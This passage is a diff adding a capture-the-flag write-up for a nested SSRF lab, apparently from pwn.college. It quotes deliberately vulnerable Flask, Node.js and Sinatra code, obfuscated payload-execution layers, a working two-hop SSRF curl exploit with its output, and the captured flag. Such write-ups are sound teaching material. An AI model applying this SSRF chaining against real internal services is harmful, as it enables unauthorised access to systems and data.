@@ -1410,3 +1410,195 @@ Progress: 34448de412c2c60bd2afb4a8c113c24c (32/32)
 
 ## Day 7 - SSRFs chain
 
+This challenge is a set of vulnerable web apps, interestingly nested like a Matryoshka doll. 
+
+### {The Turkey 🦃}
+
+**_A welcoming outer roast_**
+
+A vulnerable Flask app running as root that accepts a `hacker_image` URL:
+```html
+<form action="/check" method="POST">
+	<label for="hacker_name">Hacker Name:</label>
+	<input type="text" id="hacker_name" name="hacker_name" required>
+
+	<label for="hacker_image">Hacker Image URL (optional):</label>
+	<input type="text" id="hacker_image" name="hacker_image" placeholder="https://example.com/image.jpg">
+
+	<input type="submit" value="Check Naughty List">
+</form>
+```
+And has a route `/check` which makes an outbound HTTP request using the `requests.get()` function:
+```python
+@app.route('/check', methods=['POST'])
+def check():
+  hacker_name = request.form.get('hacker_name', '')
+  hacker_image_url = request.form.get('hacker_image', '')
+```
+
+The outer layer also deobfuscates and executes the next layer:
+```python
+if PAYLOAD:
+	decoded = base64.b64decode(PAYLOAD)
+	reversed_bytes = decoded[::-1]
+	unpacked = bytes(b ^ 0x42 for b in reversed_bytes)
+	subprocess.run(unpacked.decode(), shell=True)
+```
+
+### {The Duck 🦆}
+
+**_A warm, well-seasoned middle stuffing_**
+
+The Duck is a bash script which first sets up a network namespace to act as a middleware, with IP addresses and `iptables` rules:
+```bash
+ip netns add middleware
+ip link add veth-host type veth peer name veth-middleware
+ip link set veth-middleware netns middleware
+ip addr add 72.79.72.1/24 dev veth-host
+ip link set veth-host up
+
+ip netns exec middleware ip addr add 72.79.72.79/24 dev veth-middleware
+ip netns exec middleware ip link set veth-middleware up
+ip netns exec middleware ip route add default via 72.79.72.1
+ip netns exec middleware ip link set lo up
+
+iptables -A OUTPUT -o veth-host -m owner --uid-owner root -j ACCEPT
+iptables -A OUTPUT -o veth-host -j REJECT
+```
+
+The script then sets up a Node.js middleware service running at 72.79.72.79:80, with has its own SSRF vulnerability via the `/fetch` endpoint. This service acts as our internal pivot point int othe Chicken.
+```js
+const server = http.createServer(async (req, res) => {
+     const parsedUrl = url.parse(req.url, true);
+
+     if (parsedUrl.pathname === '/') {
+          res.writeHead(200, { 'Content-Type': 'text/html' });
+          res.end('<h1>Welcome to the middleware service. We fetch things!</h1>');
+     } else if (parsedUrl.pathname === '/fetch') {
+          const targetUrl = parsedUrl.query.url;
+
+          if (!targetUrl) {
+               res.writeHead(400, { 'Content-Type': 'text/html' });
+               res.end('<h1>Missing url parameter</h1>');
+               return;
+          }
+
+          try {
+               const response = await fetch(targetUrl);
+               const content = await response.text();
+               res.writeHead(200, { 'Content-Type': 'text/plain' });
+               res.end(content);
+          } catch (error) {
+               res.writeHead(500, { 'Content-Type': 'text/html' });
+               res.end(\`<h1>Error fetching URL: \${error.message}</h1>\`);
+          }
+     } else {
+          res.writeHead(404, { 'Content-Type': 'text/html' });
+          res.end('<h1>Not Found</h1>');
+     }
+});
+```
+The middleware is executed in the previously created network namespace by piping this whole JavaScript code to `cobol`, which is in fact Node.js:
+
+```bash
+$ /usr/bin/cobol
+Welcome to Node.js v20.19.6.
+Type ".help" for more information.
+```
+
+The Duck also decodes and executes another payload:
+```js
+const payload = 'a3IicG...';
+
+if (payload) {
+     const decoded = Buffer.from(payload, 'base64');
+     const unpacked = Buffer.from(decoded.map(byte => (byte - 2 + 256) % 256));
+     execSync(unpacked.toString(), { stdio: 'inherit' });
+}
+```
+The inner layer is easy to uncover with a few lines of Python:
+```python
+import base64
+
+payload = 'a3IicGd...'
+decoded = base64.b64decode(payload)
+
+output = "".join(["%c" % ((byte - 2 + 256) % 256) for byte in decoded])
+print(output)
+```
+
+### {The Chicked 🐔}
+
+**_A a rich, indulgent core that ties the whole dish together_**
+
+A simple Sinatra Ruby web app masquerading as PHP:
+```ruby
+require 'sinatra'
+
+set :environment, :production
+set :bind, '88.77.65.83'
+set :port, 80
+
+get '/' do
+  \"<h1>Go away, you'll never find the flag</h1>\"
+end
+
+get '/flag' do
+  if params['xmas'] == 'hohoho-i-want-the-flag'
+    File.read('/flag')
+  else
+    \"<h1>that's not correct</h1>\"
+  end
+end
+```
+The backend is executed in its own backend network namespace by piping the Ruby code to _PHP_:
+```bash
+echo "..." | ip netns exec backend /usr/bin/php - &
+```
+
+Which is in fact:
+```bash
+$ /usr/bin/php  -v
+ruby 3.2.3 (2024-01-18 revision 52bb2ac0a6) [x86_64-linux-gnu]
+```
+
+Tying everything together, this is the SSRF chain:
+* Browser → Flask App (Running as aoot on the host)
+* Flask App → Node.js Middleware (72.79.72.79/fetch)
+* Node.js Middleware → Sinatra Flag Service (88.77.65.83/flag)
+
+```bash
+$ curl -X POST "http://10.32.165.59/check" \
+  -d "hacker_name=SSRF-Exploit" \
+  -d "hacker_image=http://72.79.72.79/fetch?url=http://88.77.65.83/flag?xmas=hohoho-i-want-the-flag"
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Naughty List Result</title>
+        <style>
+            body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; }
+            h1 { color: #c41e3a; }
+            .result { margin-top: 30px; padding: 20px; border: 2px solid #c41e3a; border-radius: 5px; }
+            .naughty { background-color: #ffebee; }
+            .nice { background-color: #e8f5e9; }
+            img { max-width: 100%; margin-top: 20px; border: 1px solid #ccc; }
+            a { display: inline-block; margin-top: 20px; color: #c41e3a; }
+        </style>
+    </head>
+    <body>
+        <h1>Naughty List Result</h1>
+        <div class="result nice">
+            <h2>SSRF-Exploit</h2>
+            <p><strong>Status:</strong> NICE 😁</p>
+            <img src="data:image/png;base64,cHduLmNvbGxlZ2V7WTJDM1NzOV9qZlpGUnVRX2F6V21kOHNDalMyLlFYMUVUT3hJREx6UURNeVF6V30K" alt="Hacker Image">
+        </div>
+        <a href="/">🔙 Back to form</a>
+    </body>
+    </html>
+
+$ ecHduLmNvbGxlZ2V7WTJDM1NzOV9qZlpGUnVRX2F6V21kOHNDalMyLlFYMUVUT3hJREx6UURNeVF6V30K | base64 -d
+pwn.college{Y2C3Ss9_jfZFRuQ_azWmd8sCjS2.QX1ETOxIDLzQDMyQzW}
+```
+
+## Day 8 - 
